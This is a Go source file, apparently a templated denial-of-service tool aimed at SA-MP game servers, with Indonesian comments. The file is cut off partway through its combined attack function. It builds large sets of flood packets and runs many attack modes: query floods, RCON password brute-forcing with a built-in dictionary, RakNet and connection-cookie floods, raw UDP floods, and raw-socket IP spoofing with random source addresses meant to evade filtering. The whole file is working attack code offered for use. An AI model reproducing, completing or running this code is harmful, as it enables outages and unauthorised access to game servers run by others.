package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

// ==================== TEMPLATE VARIABLES ====================
var (
	targetIP   = "{{.TargetIP}}"
	targetPort = "{{.TargetPort}}"
	duration   = "{{.Duration}}"
	threads    = "{{.Threads}}"
	method     = "{{.Method}}"
)

// ==================== KONSTANTA ====================
const (
	SAMP_MAGIC        = "SAMP"
	SAMP_MIN_SIZE     = 11
	SAMP_MAX_SIZE     = 512
	RSA_PUBLIC_KEY    = 0x76
	RSA_PRIVATE_KEY   = 0x77
	
	// RakNet Constants
	RAKNET_MAGIC      = 0x00 // Unconnected Magic Byte
	UNCONNECTED_PING  = 0x01
	UNCONNECTED_PONG  = 0x1C
	OPEN_CONNECTION_REQUEST_1 = 0x05
	OPEN_CONNECTION_REPLY_1   = 0x06
	OPEN_CONNECTION_REQUEST_2 = 0x07
	OPEN_CONNECTION_REPLY_2   = 0x08
	CONNECTION_REQUEST        = 0x09
	CONNECTION_REQUEST_ACCEPTED = 0x10
	NEW_INCOMING_CONNECTION   = 0x0D
	CONNECTED_PING            = 0x00
	CONNECTED_PONG            = 0x03
	DISCONNECT_NOTIFICATION   = 0x15
	
	// Connection Cookie Constants
	COOKIE_REQUEST  = 0x04
	COOKIE_REPLY    = 0x05
	
	MAX_THREADS     = 100000
	SOCKET_BUF_SIZE = 32 * 1024 * 1024
	RAW_SOCKET_BUF  = 1024 * 1024
)

// ==================== GLOBAL STATE ====================
var (
	totalPackets uint64 = 0
	totalBytes   uint64 = 0
	startTime    time.Time
	stopTime     time.Time
	
	targetAddr      *net.UDPAddr
	targetIPBytes   [4]byte
	targetPortInt   int
	targetPortBytes [2]byte
	
	cfg struct {
		threadCount  int
		durationSec  int
		attackMethod string
		burstMin     int
		burstMax     int
		enableSpoof  bool
		enableRakNet bool
		enableConn   bool
	}
	
	udpPool sync.Pool
	rngPool sync.Pool
	
	variants struct {
		standard   [][]byte
		withPrefix [][]byte
		rcon       [][]byte
		ping       [][]byte
		invalid    [][]byte
		rules      [][]byte
		clients    [][]byte
		detailed   [][]byte
		raknet     [][]byte
		cookie     [][]byte
		connReq    [][]byte
	}
	
	// Raw socket untuk IP spoofing
	rawSocket int = -1
)

type ConnPool struct {
	conn *net.UDPConn
	mu   sync.Mutex
	id   uint64
}

// ==================== MAIN ====================
func main() {
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	
	if err := setupNetwork(); err != nil {
		fmt.Fprintf(os.Stderr, "Network error: %v\n", err)
		os.Exit(1)
	}
	
	// Setup raw socket untuk IP spoofing jika diperlukan
	if cfg.enableSpoof {
		if err := setupRawSocket(); err != nil {
			fmt.Fprintf(os.Stderr, "Raw socket error: %v\n", err)
			cfg.enableSpoof = false
		}
	}
	
	generateVariants()
	initPools()
	printBanner()
	executeAttack()
	waitAndReport()
}

func initConfig() error {
	var err error
	
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 1000
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	if cfg.threadCount > MAX_THREADS {
		cfg.threadCount = MAX_THREADS
	}
	
	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfg.attackMethod == "" {
		cfg.attackMethod = "GOD"
	}
	
	// Enable advanced features berdasarkan method
	cfg.enableSpoof = cfg.attackMethod == "SPOOF" || cfg.attackMethod == "GOD" || cfg.attackMethod == "RAKNET" || cfg.attackMethod == "COOKIE"
	cfg.enableRakNet = cfg.attackMethod == "RAKNET" || cfg.attackMethod == "GOD" || cfg.attackMethod == "COOKIE"
	cfg.enableConn = cfg.attackMethod == "CONN" || cfg.attackMethod == "GOD" || cfg.attackMethod == "COOKIE"
	
	cfg.burstMin = 1
	cfg.burstMax = 50
	
	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
	startTime = time.Now()
	
	return nil
}

func setupNetwork() error {
	port, err := strconv.Atoi(targetPort)
	if err != nil {
		return fmt.Errorf("invalid port: %v", err)
	}
	targetPortInt = port
	
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		return fmt.Errorf("resolve failed: %v", err)
	}
	targetAddr = addr
	
	parts := strings.Split(targetIP, ".")
	if len(parts) != 4 {
		return fmt.Errorf("invalid IP format")
	}
	for i, p := range parts {
		val, err := strconv.Atoi(p)
		if err != nil || val < 0 || val > 255 {
			return fmt.Errorf("invalid IP octet: %s", p)
		}
		targetIPBytes[i] = byte(val)
	}
	
	targetPortBytes[0] = byte(port & 0xFF)
	targetPortBytes[1] = byte((port >> 8) & 0xFF)
	
	return nil
}

func setupRawSocket() error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
	if err != nil {
		return err
	}
	
	// Enable IP_HDRINCL untuk custom IP header
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		syscall.Close(fd)
		return err
	}
	
	// Enable IP spoofing
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_OPTIONS, 1)
	if err != nil {
		syscall.Close(fd)
		return err
	}
	
	rawSocket = fd
	return nil
}

func initPools() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	udpPool = sync.Pool{
		New: func() interface{} {
			conn, err := net.DialUDP("udp", nil, targetAddr)
			if err != nil {
				return nil
			}
			
			if file, err := conn.File(); err == nil {
				fd := int(file.Fd())
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4*1024*1024)
				syscall.SetNonblock(fd, true)
				file.Close()
			}
			
			return &ConnPool{
				conn: conn,
				id:   uint64(rand.Int63()),
			}
		},
	}
	
	rngPool = sync.Pool{
		New: func() interface{} {
			return rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
		},
	}
}

// ==================== PACKET GENERATION ====================
func generateVariants() {
	fmt.Printf("[*] Generating packet variants...\n")
	
	// Generate SAMP Query variants
	variants.standard = make([][]byte, 100000)
	for i := 0; i < 100000; i++ {
		variants.standard[i] = buildSAMPPacket(i, false, 0x69)
	}
	
	variants.withPrefix = make([][]byte, 100000)
	for i := 0; i < 100000; i++ {
		variants.withPrefix[i] = buildSAMPPacket(i, true, 0x69)
	}
	
	variants.rules = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.rules[i] = buildSAMPPacket(i, false, 0x72)
	}
	
	variants.clients = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.clients[i] = buildSAMPPacket(i, false, 0x63)
	}
	
	variants.detailed = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.detailed[i] = buildSAMPPacket(i, false, 0x64)
	}
	
	variants.rcon = make([][]byte, 20000)
	for i := 0; i < 20000; i++ {
		variants.rcon[i] = buildRCONPacket(i)
	}
	
	variants.ping = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.ping[i] = buildPingPacket(i)
	}
	
	variants.invalid = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.invalid[i] = buildInvalidPacket(i)
	}
	
	// Generate RakNet variants
	if cfg.enableRakNet {
		variants.raknet = make([][]byte, 50000)
		for i := 0; i < 50000; i++ {
			variants.raknet[i] = buildRakNetPacket(i)
		}
	}
	
	// Generate Connection Cookie variants
	if cfg.enableConn {
		variants.cookie = make([][]byte, 50000)
		for i := 0; i < 50000; i++ {
			variants.cookie[i] = buildCookiePacket(i)
		}
		
		variants.connReq = make([][]byte, 50000)
		for i := 0; i < 50000; i++ {
			variants.connReq[i] = buildConnectionRequest(i)
		}
	}
	
	fmt.Printf("[+] Generated: %d standard, %d prefix, %d rules, %d clients, %d detailed, %d rcon, %d ping, %d invalid",
		len(variants.standard), len(variants.withPrefix), len(variants.rules), 
		len(variants.clients), len(variants.detailed), len(variants.rcon), 
		len(variants.ping), len(variants.invalid))
	
	if cfg.enableRakNet {
		fmt.Printf(", %d raknet", len(variants.raknet))
	}
	if cfg.enableConn {
		fmt.Printf(", %d cookie, %d connReq", len(variants.cookie), len(variants.connReq))
	}
	fmt.Printf("\n")
}

func buildSAMPPacket(variant int, usePrefix bool, opcode byte) []byte {
	buf := new(bytes.Buffer)
	
	// Optional prefix untuk evasi
	if usePrefix {
		prefix := getPrefix(variant)
		buf.Write(prefix)
	}
	
	// Core SAMP structure
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(opcode)
	
	// Padding untuk mencapai target size
	currentSize := buf.Len()
	if currentSize < SAMP_MAX_SIZE {
		targetSize := currentSize + (variant % (SAMP_MAX_SIZE - currentSize + 1))
		if targetSize > currentSize && targetSize <= SAMP_MAX_SIZE {
			padding := make([]byte, targetSize-currentSize)
			fillPattern(padding, variant)
			buf.Write(padding)
		}
	}
	
	return buf.Bytes()
}

func buildRCONPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(0x78)
	
	// Extended password dictionary
	passwords := []string{
		"rcon", "password", "1234", "admin", "samp", "owner", "server",
		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
		"root", "toor", "pass", "samp037", "samp03DL", "gta_sa", 
		"multiplayer", "sa-mp", "12345", "111111", "dragon", "master",
		"shadow", "superman", "batman", "trustno1", "iloveyou", "princess",
		"football", "baseball", "welcome", "monkey", "696969",
		"abc123", "password1", "123123", "admin123", "default",
		"gamemode", "roleplay", "freeroam", "deathmatch", "stunt",
	}
	
	commands := []string{
		"echo", "hostname", "gamemodetext", "mapname", "players", "maxplayers",
		"weburl", "worldtime", "weather", "loadfs", "unloadfs", "reloadfs",
		"ban", "kick", "kill", "say", "broadcast", "changemode", "gmx",
		"exit", "query", "rcon_password", "message", "cmdlist", "varlist",
		"password", "loadplugin", "unloadplugin", "reloadplugins",
	}
	
	basePass := passwords[variant%len(passwords)]
	suffix := strconv.Itoa(variant % 10000)
	pass := basePass + suffix
	
	cmd := commands[(variant/len(passwords))%len(commands)]
	
	passBytes := []byte(pass)
	cmdBytes := []byte(cmd)
	
	binary.Write(buf, binary.LittleEndian, uint32(len(passBytes)))
	buf.Write(passBytes)
	binary.Write(buf, binary.LittleEndian, uint32(len(cmdBytes)))
	buf.Write(cmdBytes)
	
	result := buf.Bytes()
	if len(result) > SAMP_MAX_SIZE {
		result = result[:SAMP_MAX_SIZE]
	}
	return result
}

func buildPingPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(0x70)
	
	// 4 bytes pseudo-random data
	data := make([]byte, 4)
	binary.BigEndian.PutUint32(data, uint32(variant*2654435761))
	buf.Write(data)
	
	// Padding
	if buf.Len() < 16 {
		padding := make([]byte, 16-buf.Len())
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

func buildInvalidPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	prefix := getPrefix(variant + 1000)
	buf.Write(prefix)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	
	// Invalid opcodes yang dapat memicu error handling
	invalidOps := []byte{0x00, 0xFF, 0x41, 0x42, 0x43, 0x44, 0x45, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55}
	opcode := invalidOps[variant%len(invalidOps)]
	buf.WriteByte(opcode)
	
	currentLen := buf.Len()
	targetSize := 16 + (variant % 100)
	
	if targetSize > currentLen && targetSize <= SAMP_MAX_SIZE {
		paddingSize := targetSize - currentLen
		if paddingSize > 0 {
			payload := make([]byte, paddingSize)
			rand.Read(payload)
			buf.Write(payload)
		}
	}
	
	return buf.Bytes()
}

func buildRakNetPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// RakNet Unconnected Magic (5 bytes offline message data id)
	// 0x00 + "FFFF" (4 bytes)
	buf.WriteByte(0x00)
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
	
	// Packet ID
	packetTypes := []byte{
		UNCONNECTED_PING,
		UNCONNECTED_PONG,
		OPEN_CONNECTION_REQUEST_1,
		OPEN_CONNECTION_REPLY_1,
		OPEN_CONNECTION_REQUEST_2,
		OPEN_CONNECTION_REPLY_2,
		CONNECTION_REQUEST,
		CONNECTION_REQUEST_ACCEPTED,
		NEW_INCOMING_CONNECTION,
		CONNECTED_PING,
		CONNECTED_PONG,
		DISCONNECT_NOTIFICATION,
	}
	
	pktType := packetTypes[variant%len(packetTypes)]
	buf.WriteByte(pktType)
	
	// GUID/Time stamp
	timestamp := uint64(time.Now().UnixNano() + int64(variant))
	binary.Write(buf, binary.BigEndian, timestamp)
	
	// Random payload
	payloadSize := 16 + (variant % 400)
	payload := make([]byte, payloadSize)
	rand.Read(payload)
	buf.Write(payload)
	
	return buf.Bytes()
}

func buildCookiePacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// SAMP Connection Cookie Request
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(COOKIE_REQUEST)
	
	// Random challenge data
	challenge := make([]byte, 16)
	binary.BigEndian.PutUint64(challenge[:8], uint64(variant))
	binary.BigEndian.PutUint64(challenge[8:], uint64(time.Now().UnixNano()))
	buf.Write(challenge)
	
	// Additional random data
	extra := make([]byte, variant%50)
	rand.Read(extra)
	buf.Write(extra)
	
	return buf.Bytes()
}

func buildConnectionRequest(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// SAMP Connection Request (setelah cookie)
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(NEW_INCOMING_CONNECTION)
	
	// Player name dengan variasi
	names := []string{
		"Player", "Guest", "User", "Admin", "Moderator",
		"Test", "SAMP", "GTA", "SanAndreas", "Multiplayer",
	}
	
	name := names[variant%len(names)]
	suffix := strconv.Itoa(variant % 1000)
	fullName := name + "_" + suffix
	
	// Name length + name
	buf.WriteByte(byte(len(fullName)))
	buf.WriteString(fullName)
	
	// Version string
	versions := []string{"0.3.7", "0.3.7-R2", "0.3.7-R3", "0.3.7-R4", "0.3.DL"}
	version := versions[variant%len(versions)]
	buf.WriteByte(byte(len(version)))
	buf.WriteString(version)
	
	// Random padding
	padding := make([]byte, variant%100)
	rand.Read(padding)
	buf.Write(padding)
	
	return buf.Bytes()
}

func getPrefix(variant int) []byte {
	prefixes := [][]byte{
		{0xFF, 0xFF, 0xFF, 0xFF},
		{0x00, 0x00, 0x00, 0x00},
		{0xAA, 0xAA, 0xAA, 0xAA},
		{0x55, 0x55, 0x55, 0x55},
		{0xDE, 0xAD, 0xBE, 0xEF},
		{0xCA, 0xFE, 0xBA, 0xBE},
		{0x12, 0x34, 0x56, 0x78},
		{0x9A, 0xBC, 0xDE, 0xF0},
	}
	
	if variant%10 < 8 {
		return prefixes[variant%len(prefixes)]
	}
	
	p := make([]byte, 4)
	rand.Read(p)
	return p
}

func fillPattern(data []byte, variant int) {
	pattern := variant % 12
	switch pattern {
	case 0:
		rand.Read(data)
	case 1:
		// Zeros
	case 2:
		for i := range data {
			data[i] = 0xFF
		}
	case 3:
		for i := range data {
			data[i] = byte(i % 256)
		}
	case 4:
		for i := range data {
			if i%2 == 0 {
				data[i] = 0xAA
			} else {
				data[i] = 0x55
			}
		}
	case 5:
		for i := range data {
			data[i] = SAMP_MAGIC[i%4]
		}
	case 6:
		for i := range data {
			data[i] = byte((variant + i) % 256)
		}
	case 7:
		ts := uint32(time.Now().Unix())
		for i := range data {
			data[i] = byte(ts >> (8 * (i % 4)))
		}
	case 8:
		// SAMP header pattern
		for i := range data {
			data[i] = byte(0x53 + (i % 4))
		}
	case 9:
		// Random printable ASCII
		for i := range data {
			data[i] = byte(32 + rand.Intn(95))
		}
	case 10:
		// NOP sled pattern
		for i := range data {
			data[i] = 0x90
		}
	case 11:
		// XOR pattern
		for i := range data {
			data[i] = byte(i ^ variant)
		}
	}
}

// ==================== RAW SOCKET IP SPOOFING ====================
func buildIPHeader(srcIP, dstIP [4]byte, srcPort, dstPort uint16, payloadLen uint16) []byte {
	
	// IP Header (20 bytes minimum)
	ipHeader := make([]byte, 20)
	
	// Version (4) + IHL (5) = 0x45
	ipHeader[0] = 0x45
	
	// DSCP + ECN = 0
	ipHeader[1] = 0
	
	// Total Length
	totalLen := 20 + 8 + payloadLen
	binary.BigEndian.PutUint16(ipHeader[2:4], totalLen)
	
	// Identification (random)
	binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))
	
	// Flags (0) + Fragment Offset (0)
	ipHeader[6] = 0x40 // Don't fragment
	ipHeader[7] = 0
	
	// TTL (random untuk evasi)
	ipHeader[8] = byte(64 + rand.Intn(191))
	
	// Protocol (UDP = 17)
	ipHeader[9] = 17
	
	// Header Checksum (0 untuk sementara, akan dihitung oleh kernel atau dibiarkan)
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	
	// Source IP
	copy(ipHeader[12:16], srcIP[:])
	
	// Destination IP
	copy(ipHeader[16:20], dstIP[:])
	
	// UDP Header (8 bytes)
	udpHeader := make([]byte, 8)
	binary.BigEndian.PutUint16(udpHeader[0:2], srcPort)
	binary.BigEndian.PutUint16(udpHeader[2:4], dstPort)
	binary.BigEndian.PutUint16(udpHeader[4:6], 8+payloadLen)
	binary.BigEndian.PutUint16(udpHeader[6:8], 0) // Checksum (optional untuk UDP)
	
	// Combine
	header := append(ipHeader, udpHeader...)
	return header
}

func sendSpoofedPacket(payload []byte) bool {
	if rawSocket < 0 {
		return false
	}
	
	// Generate random source IP
	var srcIP [4]byte
	srcIP[0] = byte(rand.Intn(256))
	srcIP[1] = byte(rand.Intn(256))
	srcIP[2] = byte(rand.Intn(256))
	srcIP[3] = byte(rand.Intn(256))
	
	// Random source port
	srcPort := uint16(1024 + rand.Intn(64512))
	
	// Build packet dengan IP header
	packet := buildIPHeader(srcIP, targetIPBytes, srcPort, uint16(targetPortInt), uint16(len(payload)))
	packet = append(packet, payload...)
	
	// Send via raw socket
	addr := syscall.SockaddrInet4{
		Port: targetPortInt,
		Addr: targetIPBytes,
	}
	
	err := syscall.Sendto(rawSocket, packet, 0, &addr)
	if err != nil {
		return false
	}
	
	atomic.AddUint64(&totalPackets, 1)
	atomic.AddUint64(&totalBytes, uint64(len(packet)))
	return true
}

// ==================== ATTACK EXECUTION ====================
func executeAttack() {
	fmt.Printf("[ATTACK] Method: %s | Threads: %d | Spoof: %v | RakNet: %v | Conn: %v\n", 
		cfg.attackMethod, cfg.threadCount, cfg.enableSpoof, cfg.enableRakNet, cfg.enableConn)
	
	switch cfg.attackMethod {
	case "SAMP":
		executeSAMPAttack()
	case "UDP":
		executeUDPFlood()
	case "MIX":
		executeMixedAttack()
	case "GOD":
		executeGodMode()
	case "SPOOF":
		executeSpoofAttack()
	case "RAKNET":
		executeRakNetAttack()
	case "COOKIE":
		executeCookieAttack()
	case "CONN":
		executeConnectionAttack()
	case "QUERY":
		executeQueryFlood()
	case "RCON":
		executeRCONAttack()
	default:
		executeGodMode()
	}
}

func executeSAMPAttack() {
	fmt.Printf("[VECTOR] SAMP Protocol Attack - Multi-Opcode\n")
	
	var wg sync.WaitGroup
	
	// Distribusi threads berdasarkan efektivitas
	stdCount := cfg.threadCount * 30 / 100
	rulesCount := cfg.threadCount * 15 / 100
	clientsCount := cfg.threadCount * 15 / 100
	detailedCount := cfg.threadCount * 10 / 100
	prefixCount := cfg.threadCount * 15 / 100
	rconCount := cfg.threadCount * 10 / 100
	pingCount := cfg.threadCount - stdCount - rulesCount - clientsCount - detailedCount - prefixCount - rconCount
	
	for i := 0; i < stdCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.standard)
		}(i)
	}
	
	for i := 0; i < rulesCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.rules)
		}(i)
	}
	
	for i := 0; i < clientsCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.clients)
		}(i)
	}
	
	for i := 0; i < detailedCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.detailed)
		}(i)
	}
	
	for i := 0; i < prefixCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.withPrefix)
		}(i)
	}
	
	for i := 0; i < rconCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.rcon)
		}(i)
	}
	
	for i := 0; i < pingCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.ping)
		}(i)
	}
	
	wg.Wait()
}

func executeQueryFlood() {
	fmt.Printf("[VECTOR] Query Flood - All Opcodes Coordinated\n")
	
	var wg sync.WaitGroup
	
	// Query flood dengan semua opcodes secara bersamaan
	opcodes := [][]byte{variants.standard, variants.rules, variants.clients, variants.detailed, variants.ping}
	
	for _, pool := range opcodes {
		count := cfg.threadCount / len(opcodes)
		for i := 0; i < count; i++ {
			wg.Add(1)
			go func(id int, p [][]byte) {
				defer wg.Done()
				workerSAMP(id, p)
			}(i, pool)
		}
	}
	
	wg.Wait()
}

func executeRCONAttack() {
	fmt.Printf("[VECTOR] RCON Brute Force Attack\n")
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				idx := rng.Intn(len(variants.rcon))
				packet := variants.rcon[idx]
				
				// Burst tinggi untuk RCON
				for b := 0; b < 10; b++ {
					sendPacket(conn, packet)
				}
				
				spinWait(100)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeSpoofAttack() {
	fmt.Printf("[VECTOR] IP Spoofed SAMP Attack\n")
	
	if !cfg.enableSpoof || rawSocket < 0 {
		fmt.Printf("[!] Spoofing not available, falling back to normal SAMP\n")
		executeSAMPAttack()
		return
	}
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				// Pilih random packet variant
				var packet []byte
				switch rng.Intn(5) {
				case 0:
					packet = variants.standard[rng.Intn(len(variants.standard))]
				case 1:
					packet = variants.rules[rng.Intn(len(variants.rules))]
				case 2:
					packet = variants.clients[rng.Intn(len(variants.clients))]
				case 3:
					packet = variants.ping[rng.Intn(len(variants.ping))]
				case 4:
					packet = variants.rcon[rng.Intn(len(variants.rcon))]
				}
				
				// Send dengan IP spoofing
				sendSpoofedPacket(packet)
				
				// Burst
				burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
				for b := 0; b < burst; b++ {
					sendSpoofedPacket(packet)
				}
				
				if id%50 == 0 {
					runtime.Gosched()
				}
			}
		}(i)
	}
	
	wg.Wait()
}

func executeRakNetAttack() {
	fmt.Printf("[VECTOR] RakNet Protocol Attack\n")
	
	if !cfg.enableRakNet {
		return
	}
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				idx := rng.Intn(len(variants.raknet))
				packet := variants.raknet[idx]
				
				burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
				for b := 0; b < burst; b++ {
					sendPacket(conn, packet)
				}
				
				spinWait(50 + rng.Intn(100))
			}
		}(i)
	}
	
	wg.Wait()
}

func executeCookieAttack() {
	fmt.Printf("[VECTOR] Connection Cookie Flood (Server Full Exploit)\n")
	
	if !cfg.enableConn {
		return
	}
	
	var wg sync.WaitGroup
	
	// Cookie request flood
	cookieThreads := cfg.threadCount * 60 / 100
	connThreads := cfg.threadCount - cookieThreads
	
	// Cookie flood
	for i := 0; i < cookieThreads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				idx := rng.Intn(len(variants.cookie))
				packet := variants.cookie[idx]
				
				// High burst untuk cookie requests
				for b := 0; b < 20; b++ {
					sendPacket(conn, packet)
				}
				
				spinWait(10)
			}
		}(i)
	}
	
	// Connection request flood
	for i := 0; i < connThreads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				idx := rng.Intn(len(variants.connReq))
				packet := variants.connReq[idx]
				sendPacket(conn, packet)
				spinWait(100 + rng.Intn(200))
			}
		}(i)
	}
	
	wg.Wait()
}

func executeConnectionAttack() {
	fmt.Printf("[VECTOR] Connection Layer Attack\n")
	executeCookieAttack()
}

func executeUDPFlood() {
	fmt.Printf("[VECTOR] Raw UDP Flood\n")
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				size := SAMP_MIN_SIZE + rng.Intn(SAMP_MAX_SIZE-SAMP_MIN_SIZE+1)
				payload := make([]byte, size)
				rng.Read(payload)
				
				// 30% chance untuk SAMP magic (mimic SAMP traffic)
				if id%3 == 0 {
					copy(payload[4:], []byte(SAMP_MAGIC))
				}
				
				sendPacket(conn, payload)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeMixedAttack() {
	fmt.Printf("[VECTOR] Mixed Mode - SAMP 70% + UDP 30%\n")
	
	var wg sync.WaitGroup
	
	sampT := cfg.threadCount * 70 / 100
	udpT := cfg.threadCount - sampT
	
	// SAMP threads
	for i := 0; i < sampT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			if id%2 == 0 {
				workerSAMP(id, variants.standard)
			} else {
				workerSAMP(id, variants.withPrefix)
			}
		}(i)
	}
	
	// UDP threads
	for i := 0; i < udpT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				size := 64 + rng.Intn(448)
				pkt := make([]byte, size)
				rng.Read(pkt)
				sendPacket(conn, pkt)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeGodMode() {
	fmt.Printf("[VECTOR] GOD MODE - ALL VECTORS COMBINED\n")
	
	vectors := map[string]int{
		"STANDARD": cfg.threadCount * 20 / 100,
		"RULES":    cfg.threadCount * 10 / 100,
		"CLIENTS":  cfg.threadCount * 10 / 100,
		"DETAILED": cfg.threadCount * 5 / 100,
		"PREFIX":   cfg.threadCount * 10 / 100,
		"RCON":     cfg.threadCount * 5 / 100,
		"PING":     cfg.threadCount * 5 / 100,
		"INVALID":  cfg.threadCount * 5 / 100,
		"RAKNET":   cfg.threadCount * 10 / 100,
		"COOKIE":   cfg.threadCount * 10 / 100,
		"UDP":      cfg.threadCount * 5 / 100,
		"TCP":      cfg.threadCount * 3 / 100,
		"ICMP":     cfg.threadCount * 2 / 100,
	}
	
	var wg sync.WaitGroup
	
	for vec, count := range vectors {
		switch vec {
		case "STANDARD":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.standard) }(i)
			}
		case "RULES":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.rules) }(i)
			}
		case "CLIENTS":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.clients) }(i)
			}
		case "DETAILED":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.detailed) }(i)
			}
		case "PREFIX":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.withPrefix) }(i)
			}
		case "RCON":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.rcon) }(i)
			}
		case "PING":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.ping) }(i)
			}
		case "INVALID":
			for i := 0; i < count; i++ {
				wg.Add(1)
